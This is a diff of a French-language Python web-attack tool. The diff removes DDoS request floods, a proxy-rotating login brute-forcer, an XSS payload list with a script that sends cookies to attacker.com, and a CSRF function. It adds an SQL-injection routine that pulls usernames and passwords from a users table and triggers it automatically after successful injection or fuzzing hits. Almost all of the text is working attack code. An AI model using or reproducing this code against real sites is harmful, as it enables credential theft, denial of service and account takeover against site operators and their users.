@@ -55,46 +55,6 @@ def lfi_test(url, file_path="/etc/passwd"):
         print(colored(f"[!] Erreur lors du test LFI : {e}", "red"))
         return None
 
-def ddos_attack(target, max_requests=1000):
-    print(colored("[*] Lancement de l'attaque DDoS...", "yellow"))
-    try:
-        for _ in range(max_requests):
-            response = requests.get(target, timeout=5)
-            print(f"Sending request to {target}: {response.status_code}")
-    except requests.exceptions.RequestException as e:
-        print(colored(f"[!] Erreur lors de l'attaque DDoS : {e}", "red"))
-
-def ddos_attack_with_proxies(target, max_requests=1000):
-    print(colored("[*] Lancement de l'attaque DDoS avec proxies...", "yellow"))
-    try:
-        for _ in range(max_requests):
-            proxy = get_random_proxy()
-            proxies = {"http": proxy, "https": proxy}
-            response = requests.get(target, proxies=proxies, timeout=5)
-            print(f"Sending request to {target} via proxy {proxy}: {response.status_code}")
-    except requests.exceptions.RequestException as e:
-        print(colored(f"[!] Erreur lors de l'attaque DDoS avec proxies : {e}", "red"))
-
-def bruteforce_attack_with_proxies(url, username="admin", chars="abc123", max_length=4):
-    print(colored("[ATTENTION ⚠️] Lancement de l'attaque par bruteforce avec proxy...", "yellow"))
-    for length in range(1, max_length + 1):
-        for attempt in product(chars, repeat=length):
-            password = ''.join(attempt)
-            data = {"username": username, "password": password}
-            proxy = get_random_proxy()
-            proxies = {"http": proxy, "https": proxy}
-            try:
-                response = requests.post(url, data=data, proxies=proxies, timeout=10)
-                if "Welcome" in response.text:  # Modifier selon la réponse attendue
-                    print(colored(f"[+] Mot de passe trouvé : {password}", "green"))
-                    return password
-                else:
-                    print(colored(f"[-] Tentative échouée : {password}", "red"))
-            except requests.exceptions.RequestException as e:
-                print(colored(f"[!] Erreur lors de la tentative avec {password} : {e}", "red"))
-    print(colored("[-] Bruteforce terminé sans succès.", "red"))
-    return None
-
 def advanced_sql_injection_test(url):
     print(colored("[*] Lancement du test d'injection SQL avancée...", "yellow"))
     payloads = [
@@ -108,42 +68,29 @@ def advanced_sql_injection_test(url):
             response = requests.get(url, params={'search': payload}, timeout=10)
             if "Welcome" in response.text:
                 print(f"[+] Injection réussie avec le payload: {payload}")
+                extract_passwords(url)  # Extraction des mots de passe si l'injection est réussie
             else:
                 print(colored(f"[-] L'injection avec le payload {payload} a échoué.", "red"))
         except requests.exceptions.RequestException as e:
             print(colored(f"[!] Erreur lors de l'injection SQL : {e}", "red"))
 
-def xss_attack(url):
-    print(colored("[*] Lancement de l'attaque XSS (Cross-Site Scripting)...", "yellow"))
-    payloads = [
-        "<script>alert('XSS')</script>", 
-        "<img src='x' onerror='alert(1)'>", 
-        "<script>document.location='http://attacker.com?cookie='+document.cookie</script>"
-    ]
-    for payload in payloads:
-        try:
-            response = requests.get(url, params={"input": payload}, timeout=10)
-            if payload in response.text:
-                print(colored(f"[+] Vulnérabilité XSS détectée avec le payload : {payload}", "green"))
-            else:
-                print(colored(f"[-] Le payload {payload} ne fonctionne pas.", "red"))
-        except requests.exceptions.RequestException as e:
-            print(colored(f"[!] Erreur lors de l'attaque XSS : {e}", "red"))
-
-def csrf_attack(url, post_data=None):
-    print(colored("[*] Lancement de l'attaque CSRF...", "yellow"))
-    if post_data is None:
-        post_data = {"target": "http://malicious-attack.com"}  # Payload CSRF simulé
+def extract_passwords(url):
+    print(colored("[*] Tentative d'extraction des mots de passe...", "yellow"))
+    payload = "' UNION SELECT username, password FROM users --"
     try:
-        response = requests.post(url, data=post_data, timeout=10)
-        if "Success" in response.text:  # Ajustez cette condition selon le site
-            print(colored("[+] CSRF attaque réussie!", "green"))
+        response = requests.get(url, params={'search': payload}, timeout=10)
+        if response.status_code == 200:
+            # Suppose que la page contient les mots de passe dans le texte
+            if "username" in response.text and "password" in response.text:
+                print(colored("[+] Mots de passe extraits avec succès!", "green"))
+                print(f"[+] Résultat de l'extraction: {response.text[:500]}")  # Limiter l'affichage
+            else:
+                print(colored("[-] Aucun mot de passe trouvé.", "red"))
         else:
-            print(colored("[-] L'attaque CSRF a échoué.", "red"))
+            print(colored(f"[-] Extraction échouée avec le payload: {payload}", "red"))
     except requests.exceptions.RequestException as e:
-        print(colored(f"[!] Erreur lors de l'attaque CSRF : {e}", "red"))
+        print(colored(f"[!] Erreur lors de l'extraction des mots de passe : {e}", "red"))
 
-# Ajouter la fonctionnalité de fuzzing
 def fuzzing_attack(url):
     print(colored("[*] Lancement de l'attaque de fuzzing...", "yellow"))
     fuzz_data = [
@@ -158,6 +105,8 @@ def fuzzing_attack(url):
             print(f"Test de fuzzing avec : {data} - Statut : {response.status_code}")
             if response.status_code == 200:
                 print(colored(f"[+] Fuzzing réussi avec : {data}", "green"))
+                if "' OR 1=1 --" in data:  # Si c'est une injection SQL
+                    extract_passwords(url)  # Appel pour extraire les mots de passe
             else:
                 print(colored(f"[-] Fuzzing échoué avec : {data}", "red"))
         except requests.exceptions.RequestException as e:
